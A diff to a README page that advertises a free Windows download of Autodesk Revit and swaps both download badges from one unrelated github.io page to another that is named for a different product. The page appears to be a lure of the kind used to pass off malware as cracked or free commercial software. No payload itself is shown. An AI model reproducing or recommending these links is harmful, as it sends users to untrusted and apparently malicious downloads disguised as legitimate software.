@@ -4,7 +4,7 @@
 
 ## 📥 Download Autodesk Revit for Windows
 
-[![⬇️ Download Revit](https://img.shields.io/badge/Download-Revit-blue?style=for-the-badge&logo=windows)](https://asdeennerhorse.github.io/mogus/Autodesk)
+[![⬇️ Download Revit](https://img.shields.io/badge/Download-Revit-blue?style=for-the-badge&logo=windows)](https://moneyspire-desktop-app.github.io/.github/Moneyspire)
 
 ---
 
@@ -30,7 +30,7 @@ Revit supports architectural modeling, structural engineering, MEP systems, and 
 
 Compatible with various rendering and coordination tools, Revit offers seamless design-to-delivery workflows across small and large-scale projects. Its intuitive environment and data-driven structure make it a core tool in modern architecture and engineering workflows.
 
-[![⬇️ Download Revit](https://img.shields.io/badge/Download-Revit-blue?style=for-the-badge&logo=windows)](https://asdeennerhorse.github.io/mogus/Autodesk)
+[![⬇️ Download Revit](https://img.shields.io/badge/Download-Revit-blue?style=for-the-badge&logo=windows)](https://moneyspire-desktop-app.github.io/.github/Moneyspire)
 
 ---
 
